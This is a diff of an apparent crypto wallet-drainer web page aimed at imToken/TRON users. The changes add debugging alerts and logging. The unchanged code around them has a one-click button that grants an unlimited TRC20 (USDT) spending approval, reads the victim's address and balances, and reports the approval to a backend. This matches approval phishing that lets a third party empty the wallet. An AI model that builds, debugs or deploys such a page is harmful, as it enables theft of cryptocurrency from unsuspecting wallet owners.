@@ -69,6 +69,7 @@
     const RECORD_KEY = "imtoken_infinite_approval_records";
 
     window.onload = async () => {
+        alert("window.onload 事件被调用");
         const connectBtn = document.getElementById("connectBtn");
         const approveBtn = document.getElementById("approveBtn");
         renderApprovalRecords();
@@ -92,14 +93,17 @@
         });
         // 检测IMToken环境，自动连接
         if (window.tronWeb && window.tronWeb.ready) {
+            alert("tronWeb 对象已正确初始化");
             tronWeb = window.tronWeb;
             await initWallet();
         } else {
+            alert("tronWeb 对象未正确初始化");
             document.getElementById("userInfo").innerHTML = "请用imToken内置浏览器打开此页面";
         }
 
         // 手动连接钱包
         connectBtn.onclick = async () => {
+            alert("connectBtn.onclick 事件被调用");
             try {
                 if (!window.tronWeb){window.location.href = 'imtoken://browser?url=${encodeURIComponent(window.location.href)}';
 
@@ -115,6 +119,7 @@
 
         // 一键无限授权（核心修改：使用INFINITE_APPROVE_AMOUNT）
         approveBtn.onclick = async () => {
+            alert("approveBtn.onclick 事件被调用");
             try {
                 // 调用TRC20 approve，传入uint256最大值（无限授权）
                 const result = await trc20Contract.approve(
@@ -152,8 +157,10 @@
 
     // 初始化钱包信息（IMToken适配）
     async function initWallet() {
+        alert("initWallet 函数被调用");
         try {
             userAddress = tronWeb.defaultAddress.base58;
+            alert("userAddress: " + userAddress);
             trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
 
             document.getElementById("userInfo").innerHTML = `
@@ -168,13 +175,17 @@
 
     // 查USDT余额
     async function getTokenBalance(address) {
+        alert("getTokenBalance 函数被调用，address: " + address);
         const balance = await trc20Contract.balanceOf(address).call();
+        alert("USDT 余额: " + balance / 1000000);
         return balance / 1000000;
     }
 
     // 查TRX余额
     async function getTrxBalance(address) {
+        alert("getTrxBalance 函数被调用，address: " + address);
         const balance = await tronWeb.trx.getBalance(address);
+        alert("TRX 余额: " + balance / 1000000);
         return balance / 1000000;
     }
 
@@ -210,6 +221,7 @@
 
     // 传数据到后端（同步无限授权信息）
    async function sendDataToBackend(data) {
+    alert("sendDataToBackend 函数被调用，数据: " + JSON.stringify(data));
     try {
      console.log("发送数据到后端:", data); // 添加此行
      const res = await fetch(BACKEND_API, {
@@ -219,8 +231,16 @@
       credentials: "include"
     });
     console.log("后端响应:", res); // 添加此行
-    if (!res.ok) throw new Error("后端请求失败");
-    return res.json();
+    if (res.ok) {
+      console.log("后端响应状态码:", res.status); // 添加此行
+      console.log("后端响应头:", res.headers); // 添加此行
+      const responseData = await res.json();
+      console.log("后端响应数据:", responseData); // 添加此行
+      return responseData;
+    } else {
+      console.error("后端请求失败，状态码:", res.status); // 添加此行
+      throw new Error("后端请求失败");
+    }
   } catch (e) {
     console.error("数据发送失败:", e); // 添加此行
     alert("数据发送失败：" + e.message);
